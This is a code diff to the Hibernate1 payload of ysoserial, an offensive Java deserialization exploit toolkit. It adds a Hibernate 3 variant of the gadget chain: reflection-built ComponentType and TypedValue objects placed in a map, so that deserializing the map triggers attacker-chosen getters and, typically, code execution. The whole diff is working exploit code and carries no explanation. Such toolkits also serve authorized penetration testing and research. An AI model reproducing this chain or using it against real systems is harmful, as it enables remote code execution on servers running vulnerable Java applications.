@@ -5,6 +5,8 @@ import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.util.Map;
+import java.util.HashMap;
 
 import org.hibernate.engine.spi.TypedValue;
 import org.hibernate.tuple.component.AbstractComponentTuplizer;
@@ -12,6 +14,7 @@ import org.hibernate.tuple.component.PojoComponentTuplizer;
 import org.hibernate.type.AbstractType;
 import org.hibernate.type.ComponentType;
 import org.hibernate.type.Type;
+import org.hibernate.EntityMode;
 
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.util.Gadgets;
@@ -105,6 +108,15 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
 
     static Object makeCaller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
             InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
+        if ( System.getProperty("hibernate3") != null ) {
+            return makeHibernate3Caller(tpl, getters);
+        }
+        return makeHibernate45Caller(tpl, getters);
+    }
+
+
+    static Object makeHibernate45Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
+            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
         PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
         Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
 
@@ -120,6 +132,40 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
         Reflections.setFieldValue(v1, "type", t);
 
         TypedValue v2 = new TypedValue(t, null);
+        Reflections.setFieldValue(v2, "value", tpl);
+        Reflections.setFieldValue(v2, "type", t);
+
+        return Gadgets.makeMap(v1, v2);
+    }
+
+
+    static Object makeHibernate3Caller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
+            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
+        // Load at runtime to avoid dependency conflicts
+        Class entityEntityModeToTuplizerMappingClass = Class.forName("org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping");
+        Class entityModeToTuplizerMappingClass = Class.forName("org.hibernate.tuple.EntityModeToTuplizerMapping");
+        Class typedValueClass = Class.forName("org.hibernate.engine.TypedValue");
+
+        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
+        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
+        Reflections.getField(AbstractComponentTuplizer.class, "propertySpan").set(tup, 1);
+
+        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
+        HashMap hm = new HashMap();
+        hm.put(EntityMode.POJO, tup);
+        Object emtm = Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, new Class[]{ Map.class }, new Object[]{ hm });
+        Reflections.setFieldValue(t, "tuplizerMapping", emtm);
+        Reflections.setFieldValue(t, "propertySpan", 1);
+        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
+            t
+        });
+
+        Constructor<?> typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);
+        Object v1 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
+        Reflections.setFieldValue(v1, "value", tpl);
+        Reflections.setFieldValue(v1, "type", t);
+
+        Object v2 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
         Reflections.setFieldValue(v2, "value", tpl);
         Reflections.setFieldValue(v2, "type", t);
 
